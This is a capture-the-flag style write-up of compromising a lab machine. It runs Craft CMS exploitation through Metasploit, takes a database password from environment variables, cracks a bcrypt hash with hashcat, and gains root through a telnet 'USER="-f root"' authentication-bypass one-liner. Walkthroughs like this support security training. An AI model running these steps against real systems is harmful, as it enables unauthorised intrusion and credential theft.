
I start with the IP address of the machine and now I have to find the user and system flag

### Enumeration

To begin on the right track I started with port enumeration with the help of Nmap to find the open ports
```bash
nmap -A -T4 orion.htb
```
![[Pasted image 20260723092809.png]]
- The scan reveals 2 ports open:
	- port 22 used for ssh s
	- port 80 used for http which holds a website named `Orion Telecom` running on nginx 1.18.0

### Web Exploration

The website holds a network infrastructure company
![[Pasted image 20260723092958.png]]

Searching through the page, I didn't find anything useful, no new pages, no new endpoints, no resources, so that means that there must be hidden files/directories or there is a hidden subdomain
- However, on a closer look I found in the website footer that the website utilizes `Craft CMS`  which is a CMS used for creating websites and resembles WordPress

The search for hidden subdomains came back with no result so we try to find other things

To search for hidden files and directories I start a scan with `ffuf` and hope for the best
```bash
ffuf -u http://orion.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 150 -ic 
```
![[Pasted image 20260723094225.png]]
- The scan comes back with some results from which 2 are interesting: the `admin` and `logout` pages which redirects to another page so let's see where those pages take me

The `admin` page redirects me to `orion.htb/admin/login` which is the Administration Portal of the Website
- The page is a login page but since we don't have any credentials we can not log in
- Below the login form is the real info being the version of the Craft CMS that being version `5.6.16`
![[Pasted image 20260723094432.png]]

With a quick search on Google I found that this version is vulnerable to the [CVE-2025-32432](https://censys.com/advisory/cve-2025-32432/) which is a Critical vulnerability that leads to RCE having access through a pre-authenticated Craft CMS website

To find an exploit for this vulnerability I used the Metasploit console
- Searching for an exploit I found exactly what I was looking for
![[Pasted image 20260723105009.png]]
- I set the RHOSTS option to `orion.htb` and the LHOST option to my IP address
![[Pasted image 20260723105142.png]]
- The target is indeed vulnerable so I just have to run the script
- The payload was sent and it was successful meaning that now I have access to the `www-data` user
![[Pasted image 20260723105313.png]]

### Foothold as `www-data`

One of the best method to get additional info about a particular user is to check the environmental variables with the help of `env` command
- The command returned a very good output containing sensitive information:
![[Pasted image 20260723110156.png]]
- I now have the credentials of the mysql `orion` database:
	- user = `root`
	- password = `SuperSecureCraft123Pass!`

We try to connect to mysql with these credentials and everything worked
```bash
mysql -u "root" -p
Enter password: SuperSecureCraft123Pass!
```
- With the help of the `use orion;` and then `show tables;` SQL queries I found the existence of an `users` table:
![[Pasted image 20260723110601.png]]
- Further more with the `SELECT * FROM users;` query I can now get the content of the `users` table
![[Pasted image 20260723110836.png]]
- I found the password hash for the `adam@orion.htb` user which at a quick glance seems to be a `bcrypt` hash

### Cracking the hash

Now the next step is to crack the hash and to do that I used `hashcat`
- First write the hash to a file
```bash
echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash
```
- Use `hashcat` on mode `3200` (for `bcrypt`) and use the `rockyou.txt` wordlist 
```bash
hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
```
- After running the command successfully I added the option `--show` to check the cracked hash and the result was `darkangel`

Now having the password `darkangel` for the user `adam` I was wondering if this user exists on the machine and if he was the next target
- To do that I quickly enumerated the contents of the `/home` directory
![[Pasted image 20260723111923.png]]
- There it is, the `adam` user

Now we can try to initiate a connection through ssh with the founded credentials:
- user = `adam`
- password = `darkangel`
The connection went through and I have gained access to the system as the `adam` user and found the user flag
![[Pasted image 20260723112504.png]]

## System Flag - Privilege Escalation

Next step is to escalate our privileges to the `root` user and gain access to the whole system

Before I can do that I have to understand the system and one of the ways to do that is to check all the active connections the target has:
- To do that I have to use the `ss -tulnp` command
![[Pasted image 20260723113034.png]]
- The output was satisfactory as I think I found my next step:
	- The target has an active connection with the localhost address on port 23, so basically it has some service open on that port 

The port 23 is very renown for being used by the `telnet` protocol which is used for communication between computers very much like `ssh` (basically `ssh`'s ancestor) 

The presence of `telnet` does not mean that it is vulnerable so we have to check the version of the service and then search if there are any present exploits for that version
```bash
telnet --version
```
- The command above provided us with the version of the telnet service, which is the `2.7` version

Searching on Google was very easy as I found that there is an exploit for this version that leads to privilege escalation to the `root` user, the [CVE-2026-24061](https://nvd.nist.gov/vuln/detail/cve-2026-24061) vulnerability
- The vulnerability is pretty straightforward, by letting a user to remote authentication bypass via a `-f root` value for the `USER` environment variable

Without anything left to say let's try to gain access to the `root` user and get the wanted system flag
- Craft the one liner that permits the exploit
```bash
USER="-f root" telnet -a 127.0.0.1 23
```
- Pressing enter the access to the system was given and now I can get the system flag
![[Pasted image 20260723114521.png]]

